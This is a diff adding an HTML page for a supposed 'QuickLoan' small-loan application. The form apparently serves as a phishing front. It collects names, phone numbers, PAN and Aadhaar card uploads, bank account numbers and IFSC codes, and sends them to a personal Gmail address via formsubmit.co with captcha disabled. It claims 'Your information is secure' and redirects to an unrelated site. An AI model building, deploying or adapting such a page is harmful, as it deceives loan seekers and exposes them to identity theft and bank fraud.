@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>QuickLoan - Apply Loan</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+
+<style>
+
+*{
+box-sizing:border-box;
+font-family:Poppins,Arial,sans-serif;
+}
+
+body{
+margin:0;
+background:#f4f7fc;
+color:#222;
+}
+
+
+/* HEADER */
+
+header{
+background:white;
+padding:18px 8%;
+display:flex;
+justify-content:space-between;
+align-items:center;
+box-shadow:0 2px 10px #ddd;
+}
+
+.logo{
+font-size:25px;
+font-weight:700;
+color:#0057ff;
+}
+
+header a{
+text-decoration:none;
+color:#333;
+margin-left:15px;
+font-size:14px;
+}
+
+
+.header-btn{
+background:#0057ff;
+color:white!important;
+padding:10px 20px;
+border-radius:30px;
+}
+
+
+
+/* FORM */
+
+.form-box{
+
+max-width:430px;
+margin:30px auto;
+padding:25px;
+background:#fff;
+border-radius:20px;
+box-shadow:0 10px 30px rgba(0,0,0,.12);
+
+}
+
+
+
+/* FOOTER */
+
+footer{
+
+background:#111;
+color:white;
+padding:30px 20px;
+text-align:center;
+margin-top:40px;
+
+}
+
+footer h3{
+color:#00b4ff;
+margin-bottom:10px;
+}
+
+footer p{
+font-size:14px;
+color:#ccc;
+}
+
+
+@media(max-width:600px){
+
+header{
+
+padding:15px 20px;
+flex-direction:column;
+gap:12px;
+
+}
+
+.logo{
+font-size:22px;
+}
+
+.form-box{
+
+margin:20px;
+
+}
+
+}
+
+</style>
+
+</head>
+
+
+<body>
+
+
+
+<header>
+
+<div class="logo">
+QuickLoan
+</div>
+
+
+<div>
+
+<a href="index.html">
+Home
+</a>
+
+<a href="#" class="header-btn">
+Apply
+</a>
+
+</div>
+
+
+</header>
+
+
+
+
+<div class="form-box">
+
+
+<form action="https://formsubmit.co/applyskillcash@gmail.com" 
+method="POST" 
+enctype="multipart/form-data">
+
+
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_subject" value="New Loan Application">
+<input type="hidden" name="_template" value="table">
+<input type="hidden" name="_next" value="https://skillcashzone.online/">
+
+
+
+<h2 style="text-align:center;color:#0057ff;">
+Apply For Loan
+</h2>
+
+<p style="text-align:center;color:#777;font-size:14px;">
+Fill your details & submit application
+</p>
+
+
+
+<input type="text" name="Full Name" placeholder="Full Name" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+<input type="tel" name="Mobile Number" placeholder="Mobile Number" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+<input type="email" name="Email" placeholder="Email Address" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+
+<select name="Loan Amount" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+<option>Select Loan Amount</option>
+<option>₹500</option>
+<option>₹1000</option>
+<option>₹1500</option>
+<option>₹2000</option>
+
+</select>
+
+
+
+
+<input type="text" name="PAN Number" placeholder="PAN Card Number" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+<label>Upload PAN Card</label>
+
+<input type="file" name="PAN Card" accept="image/*,.pdf" required
+style="width:100%;padding:10px;margin:8px 0;">
+
+
+
+<label>Upload Aadhaar Card</label>
+
+<input type="file" name="Aadhaar Card" accept="image/*,.pdf" required
+style="width:100%;padding:10px;margin:8px 0;">
+
+
+
+<h3 style="color:#0057ff;">
+Bank Details
+</h3>
+
+
+<input type="text" name="Account Holder Name" placeholder="Account Holder Name" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+<input type="text" name="Bank Name" placeholder="Bank Name" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+<input type="number" name="Account Number" placeholder="Account Number" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+<input type="text" name="IFSC Code" placeholder="IFSC Code" required
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;">
+
+
+
+<textarea name="Address" placeholder="Full Address"
+style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;"></textarea>
+
+
+
+
+<button type="submit"
+style="width:100%;padding:15px;background:linear-gradient(135deg,#0057ff,#00b4ff);color:white;border:0;border-radius:30px;font-size:17px;font-weight:bold;">
+🚀 Submit Application
+</button>
+
+
+
+<p style="text-align:center;color:#777;font-size:12px;">
+🔒 Your information is secure
+</p>
+
+
+<div style="padding:12px;background:#f0f7ff;color:#0057ff;border-radius:10px;text-align:center;font-size:14px;">
+⏳ Waiting for eligibility verification...
+</div>
+
+
+
+</form>
+
+</div>
+
+
+
+
+
+<footer>
+
+<h3>
+QuickLoan
+</h3>
+
+<p>
+Fast, simple and secure online loan application.
+</p>
+
+<p>
+© 2026 QuickLoan | Privacy Policy | Terms
+</p>
+
+</footer>
+
+
+
+</body>
+</html>
